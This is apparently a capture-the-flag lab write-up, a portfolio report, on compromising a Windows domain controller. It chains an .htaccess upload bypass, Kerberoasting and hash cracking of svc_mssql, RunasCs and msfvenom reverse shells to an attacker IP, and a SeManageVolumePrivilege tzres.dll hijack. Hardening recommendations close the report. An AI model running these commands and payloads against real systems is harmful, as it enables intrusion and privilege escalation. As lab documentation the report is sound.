---
title: cvb
target: dfvgbh
platform: PG
difficulty: Hard
date: 2026-01-04
description: dfghjk
---
Executive Summary
The target exposed an insecure file upload workflow that allowed uploading an .htaccess file and running PHP code via a custom extension. This resulted in a reverse shell as svc_apache. From that foothold, Kerberoasting was used to obtain a crackable TGS for svc_mssql, leading to credential recovery. Using RunasCs, a reverse shell was established under svc_mssql. Finally, the presence of SeManageVolumePrivilege enabled writing into a protected directory and performing a DLL hijack by placing a malicious tzres.dll into C:\Windows\System32\wbem\. Triggering systeminfo loaded the DLL and delivered an elevated reverse shell.

Key Issues
• File upload filter bypass via .htaccess → PHP execution
• Kerberoastable service account: svc_mssql (RC4 TGS)
• Privileged file write path (via SeManageVolumePrivilege)
• DLL hijacking opportunity: missing tzres.dll under wbem
Attack Path
Enumerate services (Nmap)
Abuse upload feature to execute PHP via .dork
Reverse shell as svc_apache
Identify SPN and perform Kerberoasting
Crack TGS → recover svc_mssql password
Use RunasCs → reverse shell as svc_mssql
Run SeManageVolumeExploit binary
Place malicious tzres.dll and trigger systeminfo → elevated shell
Recon & Service Discovery
Full TCP scan identified the host as a Windows domain controller running Apache/PHP and Kerberos/LDAP services.

# Nmap (sanitized)
PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Apache httpd 2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open   ssl/http      Apache httpd 2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
445/tcp   open   microsoft-ds
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (access.offsec)
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0
Initial Access — File Upload to RCE
The web application exposed a ticket purchase workflow with an image upload feature. File type validation could be bypassed by uploading an .htaccess file and mapping a custom extension to PHP execution.

# .htaccess used for extension-to-PHP mapping
AddType application/x-httpd-php .dork
A PHP reverse shell (custom extension .dork) was uploaded and executed from the discovered upload directory.

# Fuzzing to discover upload directory
200   777B   http://TARGET/uploads/
301   344B   http://TARGET/uploads    -> /uploads/
403   304B   http://TARGET/web.config::$DATA
403   423B   http://TARGET/webalizer/
File upload form
File upload form (click to zoom)
.htaccess content
.htaccess mapping (click to zoom)
Fuzzing results
Upload directory discovery (click to zoom)
Privilege Escalation — Kerberoasting to svc_mssql
After obtaining a foothold as svc_apache, Service Principal Names (SPNs) were enumerated to identify Kerberoastable accounts.

PS C:\xampp\htdocs> setspn -T ACCESS -Q */*
...
CN=MSSQL,CN=Users,DC=access,DC=offsec
        MSSQLSvc/DC.access.offsec

Existing SPN found!
Rubeus was uploaded and used to request a TGS for svc_mssql (RC4_HMAC). The resulting hash was cracked offline with Hashcat (mode 13100), recovering the password: trustno1.

# Hashcat
hashcat -m 13100 -a 0 mssql.hash rockyou.txt
# Result
svc_mssql : trustno1
SPN enumeration
SPN enumeration (click to zoom)
Uploading Rubeus
Uploading Rubeus (click to zoom)
Kerberoast hash
Kerberoast hash & cracking (click to zoom)
Lateral Move — Shell as svc_mssql (RunasCs)
Standard interactive techniques were constrained (no stable TTY). Using RunasCs, a reverse shell was spawned under svc_mssql using the recovered credentials.

# Listener
nc -nvlp 4444

# RunasCs (svc_mssql)
.\RunasCs.exe svc_mssql trustno1 "cmd.exe" -r 192.168.45.184:4444
C:\Windows\system32> whoami /priv

Privilege Name                State
----------------------------  --------
SeManageVolumePrivilege       Disabled
RunasCs execution
RunasCs (click to zoom)
Referenced Tools
• RunasCs: https://github.com/antonioCoco/RunasCs
Elevation — SeManageVolume + DLL Hijack (tzres.dll)
With SeManageVolumePrivilege present, a known abuse path was used to enable protected directory file placement. Prior to the DLL hijack stage, the binary SeManageVolumeExploit.exe was executed to facilitate writing into C:\Windows\System32\wbem\. The target analysis indicated that systeminfo would attempt to load tzres.dll from that directory if missing, enabling DLL hijacking.

DLL Payload Creation
# Generate tzres.dll reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.184 LPORT=5555 -f dll -o tzres.dll
Trigger
# Listener
nc -nvlp 5555

# Trigger DLL load
systeminfo
Outcome
After placing tzres.dll into wbem and triggering systeminfo, the service loaded the malicious DLL, resulting in an elevated reverse shell (administrator-level), completing the compromise chain.

Validation
• Confirm elevated identity via whoami
• Confirm administrative token / group membership as appropriate
Referenced Tools
• SeManageVolumeAbuse: https://github.com/xct/SeManageVolumeAbuse
• SeManageVolumeExploit (release): https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
Recommendations
• Enforce strict server-side upload validation; block .htaccess uploads and disable per-directory overrides where possible.
• Restrict execution in upload directories; enforce non-executable storage locations and validate MIME types server-side.
• Reduce Kerberoasting risk: use AES-only where possible, rotate service passwords, and enforce strong random service account passwords.
• Minimize privileged rights: avoid granting SeManageVolumePrivilege to non-admin service accounts unless required.
• Harden DLL loading: use absolute paths, SetDefaultDllDirectories, and remove unsafe search paths; review application directories for weak ACLs.
© 2026 Josh Chalabi — Report generated for portfolio documentation.
